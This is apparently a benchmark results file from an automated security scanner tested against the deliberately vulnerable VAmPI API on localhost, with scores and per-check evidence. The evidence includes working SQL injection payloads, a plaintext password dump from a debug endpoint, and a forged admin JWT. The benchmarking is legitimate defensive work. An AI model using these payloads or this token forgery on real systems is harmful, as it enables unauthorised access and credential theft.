@@ -1,0 +1,280 @@
+{
+  "generated_at": "2026-08-14T09:19:00.893443+00:00",
+  "target": "http://localhost:8082",
+  "runs": 3,
+  "stability": {
+    "scored_timeouts": [],
+    "stable": true
+  },
+  "scorecard": {
+    "summary": {
+      "manifest_positives": 5,
+      "manifest_negative_controls": 3,
+      "findings_total": 5,
+      "findings_real": 5,
+      "findings_simulated_dropped": 0,
+      "true_positives": 5,
+      "validated_true_positives": 5,
+      "unvalidated_matches": 0,
+      "false_negatives": 0,
+      "false_positives": 0,
+      "extras_for_triage": 0,
+      "precision": 1.0,
+      "recall": 1.0,
+      "validated_recall": 1.0,
+      "coverage": 1.0,
+      "evidence_completeness": 1.0,
+      "mock_llm": false
+    },
+    "matched": [
+      {
+        "gt_id": "VAMPI-001",
+        "finding_id": "vampi-bench-vampi-001-20260814091900",
+        "finding_type": "sqli",
+        "endpoint": "http://localhost:8082/users/v1/",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "payload",
+          "request",
+          "response",
+          "sqlmap_injection",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "VAMPI-002",
+        "finding_id": "vampi-bench-vampi-002-20260814091900",
+        "finding_type": "sqli",
+        "endpoint": "http://localhost:8082/users/v1/",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "payload",
+          "request",
+          "response",
+          "sqlmap_injection",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "VAMPI-003",
+        "finding_id": "vampi-bench-vampi-003-20260814091900",
+        "finding_type": "idor",
+        "endpoint": "http://localhost:8082/users/v1/",
+        "confidence": 0.95,
+        "evidence_kinds": [
+          "idor",
+          "note",
+          "request",
+          "response",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "VAMPI-004",
+        "finding_id": "vampi-bench-vampi-004-20260814091900",
+        "finding_type": "exposedsecret",
+        "endpoint": "http://localhost:8082/users/v1/_debug",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "exposed_secret",
+          "leaked_fields",
+          "note",
+          "request",
+          "response",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "VAMPI-005",
+        "finding_id": "vampi-bench-vampi-005-20260814091900",
+        "finding_type": "jwt",
+        "endpoint": "http://localhost:8082/me",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "jwt_forgery",
+          "note",
+          "request",
+          "response",
+          "status_code",
+          "token",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      }
+    ],
+    "unvalidated_matches": [],
+    "false_negatives": [],
+    "false_positives": [],
+    "extras": [],
+    "notes": [
+      "recall measured over manifest positives (what MUST be found).",
+      "validated_recall counts only matches with validated=true, no manual confirmation requirement, and complete manifest-required evidence.",
+      "precision measured only against explicit negative controls; None means no negative controls were defined.",
+      "extras are findings unmapped to any manifest entry \u2014 triage manually, not counted as false positives.",
+      "simulated/mock findings dropped before scoring."
+    ]
+  },
+  "findings_export": "C:\\Users\\HP\\OneDrive\\Desktop\\burp_mcp\\ai-osop\\benchmarks\\results\\owasp-vampi-core-v1-findings.json",
+  "per_check": {
+    "VAMPI-001": {
+      "name": "VAMPI-001",
+      "type": "SQLi",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.26,
+      "evidence": {
+        "request": "http://localhost:8082/users/v1/x%27%20AND%201%3D0%20UNION%20SELECT%201%2C%27sqli_probe%27%2C%27pw%27%2C%27probe%40sqli.com%27%2C0--",
+        "response": "{\"username\": \"sqli_probe\", \"email\": \"probe@sqli.com\"}",
+        "status_code": 200,
+        "type": "sqlmap_injection",
+        "payload": "x' AND 1=0 UNION SELECT 1,'sqli_probe','pw','probe@sqli.com',0--"
+      },
+      "error": null
+    },
+    "VAMPI-002": {
+      "name": "VAMPI-002",
+      "type": "SQLi",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.26,
+      "evidence": {
+        "request": "http://localhost:8082/users/v1/%27%20OR%20%271%27%3D%271%27--",
+        "response": "{\"username\": \"name1\", \"email\": \"mail1@mail.com\"}",
+        "status_code": 200,
+        "type": "sqlmap_injection",
+        "payload": "' OR '1'='1'--"
+      },
+      "error": null
+    },
+    "VAMPI-003": {
+      "name": "VAMPI-003",
+      "type": "IDOR",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 0.95,
+      "seconds": 0.27,
+      "evidence": {
+        "request": "http://localhost:8082/users/v1/name1",
+        "response": "{\"username\": \"name1\", \"email\": \"mail1@mail.com\"}",
+        "status_code": 200,
+        "type": "idor",
+        "note": "profile returned without any Authorization header (broken object-level authorization)"
+      },
+      "error": null
+    },
+    "VAMPI-004": {
+      "name": "VAMPI-004",
+      "type": "ExposedSecret",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.27,
+      "evidence": {
+        "request": "http://localhost:8082/users/v1/_debug",
+        "response": "{\n  \"users\": [\n    {\n      \"admin\": false,\n      \"email\": \"mail1@mail.com\",\n      \"password\": \"pass1\",\n      \"username\": \"name1\"\n    },\n    {\n      \"admin\": false,\n      \"email\": \"mail2@mail.com\",\n      \"password\": \"pass2\",\n      \"username\": \"name2\"\n    },\n    {\n      \"admin\": true,\n      \"email\": \"admin@mail.com\",\n      \"password\": \"pass1\",\n      \"username\": \"admin\"\n    }\n  ]\n}\n",
+        "status_code": 200,
+        "type": "exposed_secret",
+        "note": "plaintext passwords exposed via the _debug endpoint",
+        "leaked_fields": [
+          "username",
+          "password",
+          "email",
+          "admin"
+        ]
+      },
+      "error": null
+    },
+    "VAMPI-005": {
+      "name": "VAMPI-005",
+      "type": "JWT",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.27,
+      "evidence": {
+        "request": "http://localhost:8082/me",
+        "response": "{\"data\": {\"admin\": true, \"email\": \"admin@mail.com\", \"username\": \"admin\"}, \"status\": \"success\"}",
+        "status_code": 200,
+        "type": "jwt_forgery",
+        "token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4ifQ.vOGDbDj4wQhYmxXtncsUT7y9CIELiO8iqOI_eu64vU0",
+        "note": "HS256 token forged with the hardcoded secret accepted by the API (admin identity)"
+      },
+      "error": null
+    },
+    "VAMPI-NEG-001": {
+      "name": "VAMPI-NEG-001",
+      "type": "SQLi",
+      "expected_exploitable": false,
+      "validated": false,
+      "status": "NOT_FOUND",
+      "confidence": 0.0,
+      "seconds": 0.26,
+      "evidence": {
+        "note": "benign fetch \u2014 the requested user's own row is returned",
+        "status_code": 200,
+        "request": "http://localhost:8082/users/v1/name1"
+      },
+      "error": null
+    },
+    "VAMPI-NEG-002": {
+      "name": "VAMPI-NEG-002",
+      "type": "ExposedSecret",
+      "expected_exploitable": false,
+      "validated": false,
+      "status": "NOT_FOUND",
+      "confidence": 0.0,
+      "seconds": 0.27,
+      "evidence": {
+        "note": "user list endpoint exposes only username/email \u2014 no secrets",
+        "status_code": 200,
+        "request": "http://localhost:8082/users/v1"
+      },
+      "error": null
+    },
+    "VAMPI-NEG-003": {
+      "name": "VAMPI-NEG-003",
+      "type": "AuthBypass",
+      "expected_exploitable": false,
+      "validated": false,
+      "status": "NOT_FOUND",
+      "confidence": 0.0,
+      "seconds": 0.27,
+      "evidence": {
+        "note": "failed login \u2014 no token granted",
+        "status_code": 200,
+        "request": "http://localhost:8082/users/v1/login"
+      },
+      "error": null
+    }
+  }
+}
